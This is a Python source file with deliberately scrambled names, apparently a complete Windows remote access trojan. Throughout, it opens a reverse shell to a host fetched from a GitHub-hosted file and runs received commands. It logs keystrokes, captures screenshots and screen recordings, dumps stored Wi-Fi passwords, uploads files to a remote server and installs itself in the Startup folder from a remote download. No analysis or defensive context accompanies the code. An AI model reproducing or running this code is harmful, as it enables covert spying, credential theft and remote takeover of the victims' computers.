import subprocess,socket,time,requests,os,logging,imageio
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
ocBiexkEZOITxpmBmxhW = ""
rzdskFOlqTIlqTUOdNlJkAk = ""
xiLBMKX = "12.12.24.5"
MDmrSVWrgDawHCxDsrLreWx = "!"
BklaVjchHipQoEsbEpNPeIL = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
QupDvdodbuaRaWrbyjktgr = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
KbDuzCCNZxVBwXYlBZhfZ = os.path.expanduser("~\\AppData\\Local\\")
def FQXPiPHQRBFOBurmUFBECBL(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def cIoonDDyIJquijcfERTjEWK(s):
	bQmLHRHHPx = s.recv(1024)
	if len(bQmLHRHHPx)==0:
		return True
	EBbbQDECdGUTmCnLy = bQmLHRHHPx.decode("utf-8").replace("\n","")
	if not EBbbQDECdGUTmCnLy.startswith(MDmrSVWrgDawHCxDsrLreWx):
		proc = subprocess.run(EBbbQDECdGUTmCnLy, shell=True, capture_output=True)
		tTukJUeqbaDnoXXZDG = proc.stdout + proc.stderr
		s.send(tTukJUeqbaDnoXXZDG)
		return
	cGwGnTVDhJYSswXas = EBbbQDECdGUTmCnLy.split(" ")[0][1:]
	args = " ".join(EBbbQDECdGUTmCnLy.split()[1:]).split()
	if cGwGnTVDhJYSswXas == "download":
		CKjdXejNYxvnvP(s, EBbbQDECdGUTmCnLy)
	elif cGwGnTVDhJYSswXas == "screenshot":
		reWOxQl(s)
	elif cGwGnTVDhJYSswXas == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif cGwGnTVDhJYSswXas == "update":
		xGZjUFHzhlcyrsk(s)
	elif cGwGnTVDhJYSswXas == "wifi":
		aeJkrtgj(s)
	elif cGwGnTVDhJYSswXas == "screenrecord":
		iinadRssN(s, args)
def CKjdXejNYxvnvP(s, EBbbQDECdGUTmCnLy):
	pHsvJLLyNTGubaIo = EBbbQDECdGUTmCnLy.replace(MDmrSVWrgDawHCxDsrLreWx+"download ","").split(",")
	tTukJUeqbaDnoXXZDGs = ""
	for f in pHsvJLLyNTGubaIo:
		tTukJUeqbaDnoXXZDGs += sDeqUBkg(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(tTukJUeqbaDnoXXZDGs, "utf-8"))
def reWOxQl(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	vNJXxAcLbusvrghY = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(vNJXxAcLbusvrghY)
	image.close()
	r = sDeqUBkg(vNJXxAcLbusvrghY, "api/sscap")
	os.remove(vNJXxAcLbusvrghY)
	s.send(bytes(r,"utf-8"))
def iinadRssN(s, args):
	KyuuFRyYXqScVxuXJMLqy = 15
	if not args == []:
		try: KyuuFRyYXqScVxuXJMLqy = int(args[0])
		except: pass
	cxItBFrymSemav = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	ZsgKnRqwXv = []
	fps = 11
	numFrames = KyuuFRyYXqScVxuXJMLqy * fps
	for _ in range(numFrames):
		ZsgKnRqwXv.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(cxItBFrymSemav, ZsgKnRqwXv, fps=fps, quality=8)
	sDeqUBkg(cxItBFrymSemav, "api/file")
def sDeqUBkg(umWngChWdCPLRyX, RSkFyVKsitNloTeDks, aVIDxfbqAdKNFDpoJOlQsN=None):
	if not os.path.isfile(umWngChWdCPLRyX):
		return "[!] 404: "+umWngChWdCPLRyX+"\n"
	headers = {"user":os.getlogin()}
	if aVIDxfbqAdKNFDpoJOlQsN is not None:
		headers = {**headers, **aVIDxfbqAdKNFDpoJOlQsN}
	requests.post("http://"+ocBiexkEZOITxpmBmxhW+":5555/"+RSkFyVKsitNloTeDks,
		files={"file":open(umWngChWdCPLRyX, "rb")},
		headers=headers)
	return "[+] 200:\n"
def xGZjUFHzhlcyrsk(s):
	h, p, v = kTODqcpRd(True)
	if (v != xiLBMKX):
		BQyRSeuqJmLAXcIYfsfu(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def aeJkrtgj(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	ZGCeeaez = ""
	for p in profiles:
		try: ZGCeeaez+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: ZGCeeaez+=f"    {p} - N/A\n"
	s.send(bytes(ZGCeeaez, "utf-8"))
def BQyRSeuqJmLAXcIYfsfu(bgKafUZogKz):
	dbyHJfwBKvYwskRcXJiWx = os.path.basename(__file__)
	fileType = dbyHJfwBKvYwskRcXJiWx.split(".")[-1]
	CPwKmBxNoDQ = dbyHJfwBKvYwskRcXJiWx.split(".")[0]+"."+bgKafUZogKz+".pyw" if fileType.startswith("py") else ".exe"
	ApBLGAy = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), CPwKmBxNoDQ)
	if not os.path.isfile(ApBLGAy):
		with open(ApBLGAy, "w+") as f:
			f.write(requests.get(QupDvdodbuaRaWrbyjktgr+"file."+ "pyw" if ApBLGAy.split(".")[-1].startswith("py") else "exe").text)
def kTODqcpRd(force=False):
	global ocBiexkEZOITxpmBmxhW, rzdskFOlqTIlqTUOdNlJkAk
	if force or ocBiexkEZOITxpmBmxhW == "" or rzdskFOlqTIlqTUOdNlJkAk == "":
		bQmLHRHHPx = requests.get(BklaVjchHipQoEsbEpNPeIL).text.replace("\n","").split(":")
		ocBiexkEZOITxpmBmxhW = bQmLHRHHPx[0].strip()
		rzdskFOlqTIlqTUOdNlJkAk = bQmLHRHHPx[1].strip()
		bgKafUZogKz = bQmLHRHHPx[2].strip()
	return ocBiexkEZOITxpmBmxhW, rzdskFOlqTIlqTUOdNlJkAk, bgKafUZogKz
def rABfsNssg():
	try:
		VhGHUcLHnsihuWSo = "settings.xpb"
		Qkoztab = sorted([file for file in os.listdir(KbDuzCCNZxVBwXYlBZhfZ) if os.path.isfile(KbDuzCCNZxVBwXYlBZhfZ+"\\"+file) and file.endswith(VhGHUcLHnsihuWSo.split(".")[-1])])
		if VhGHUcLHnsihuWSo in Qkoztab:
			Qkoztab.remove(VhGHUcLHnsihuWSo)
		PIBqTRXw = os.path.join(KbDuzCCNZxVBwXYlBZhfZ,VhGHUcLHnsihuWSo)
		if len(Qkoztab) > 0:
			with open(PIBqTRXw, "ab+") as f:
				for file in Qkoztab:
					temp = os.path.join(KbDuzCCNZxVBwXYlBZhfZ,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		sDeqUBkg(PIBqTRXw, "api/log")
		if os.path.isfile(PIBqTRXw):
			os.remove(PIBqTRXw)
	except:
		pass
def jpDUOtilFjJoHZK():
	logging.basicConfig(filename=(KbDuzCCNZxVBwXYlBZhfZ+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def poQOoKpyITpVctW(k):
		logging.info(str(k))
	k=Listener(on_press=poQOoKpyITpVctW)
	tNUhpCIcF = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in tNUhpCIcF:
		l.setLevel(logging.CRITICAL)
	k.start()
def fjBobpYwy():
	h, p, v = kTODqcpRd()
	rABfsNssg()
	if xiLBMKX != v:
		BQyRSeuqJmLAXcIYfsfu(v)
	jpDUOtilFjJoHZK()
	MGhxnyzxcSayej = bytes(("(old)"if xiLBMKX!=v else "")+"["+xiLBMKX+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				xSEmwiQzEDBBDGbQZPUbIhY=False
				try:
					s=FQXPiPHQRBFOBurmUFBECBL(h, p)
					while not xSEmwiQzEDBBDGbQZPUbIhY:
						s.send(MGhxnyzxcSayej)
						xSEmwiQzEDBBDGbQZPUbIhY=cIoonDDyIJquijcfERTjEWK(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
fjBobpYwy()
